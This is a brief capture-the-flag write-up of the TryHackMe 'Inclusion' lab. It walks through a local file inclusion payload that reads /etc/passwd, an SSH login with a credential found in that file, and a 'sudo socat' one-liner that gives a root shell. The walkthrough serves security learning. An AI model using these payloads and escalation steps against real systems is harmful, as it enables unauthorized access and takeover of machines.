[THM] Inclusion
================
Notes by undermouse, 15.11.2020

# Gathering access to the machine itself

Scanned with nmap. Found `ssh` and `http` servers are running.

Niether gobuster, nor nikto given results.

But found LFI vurnulable parameter on /article named `name`
Tryed:
```
article?name=../../../../../../../../../../../../../../../etc/passwd
```
And got:
```
 root:x:0:0:root:/root:/bin/bash daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin bin:x:2:2:bin:/bin:/usr/sbin/nologin sys:x:3:3:sys:/dev:/usr/sbin/nologin sync:x:4:65534:sync:/bin:/bin/sync games:x:5:60:games:/usr/games:/usr/sbin/nologin man:x:6:12:man:/var/cache/man:/usr/sbin/nologin lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin mail:x:8:8:mail:/var/mail:/usr/sbin/nologin news:x:9:9:news:/var/spool/news:/usr/sbin/nologin uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin proxy:x:13:13:proxy:/bin:/usr/sbin/nologin www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin backup:x:34:34:backup:/var/backups:/usr/sbin/nologin list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin irc:x:39:39:ircd:/var/run/ircd:/usr/sbin/nologin gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin systemd-network:x:100:102:systemd Network Management,,,:/run/systemd/netif:/usr/sbin/nologin systemd-resolve:x:101:103:systemd Resolver,,,:/run/systemd/resolve:/usr/sbin/nologin syslog:x:102:106::/home/syslog:/usr/sbin/nologin messagebus:x:103:107::/nonexistent:/usr/sbin/nologin _apt:x:104:65534::/nonexistent:/usr/sbin/nologin lxd:x:105:65534::/var/lib/lxd/:/bin/false uuidd:x:106:110::/run/uuidd:/usr/sbin/nologin dnsmasq:x:107:65534:dnsmasq,,,:/var/lib/misc:/usr/sbin/nologin landscape:x:108:112::/var/lib/landscape:/usr/sbin/nologin pollinate:x:109:1::/var/cache/pollinate:/bin/false falconfeast:x:1000:1000:falconfeast,,,:/home/falconfeast:/bin/bash #falconfeast:rootpassword sshd:x:110:65534::/run/sshd:/usr/sbin/nologin mysql:x:111:116:MySQL Server,,,:/nonexistent:/bin/false 
```

In the tons of crap I found user `falconfeast` and commented string
```
#falconfeast:rootpassword
```

So I tried to connect via ssh
```
ssh falconfeast@ip
```
With password:
```
falconfeast
```

And... Connected!

# We're on machine
So, the first flag is our and is in `falconfeast's` home folder.

Interesting thing, that `falconfeast` can run some commands as root.
```bash
sudo -l
> *lots of crap* 
> (root) NOPASSWD: /usr/bin/socat
```

Let's find something online.

Found this line on GTFOBins:
```
sudo socat stdin exec:/bin/sh
```

And this basically gives me obility to become root.
The second flag is in my hands, muahahahahahahha.


# Notes to remember:
- Always check for `HTTP variables`, they can lead to __Local File Inclusion__
- **Don't leave comments** in files like `/etc/password`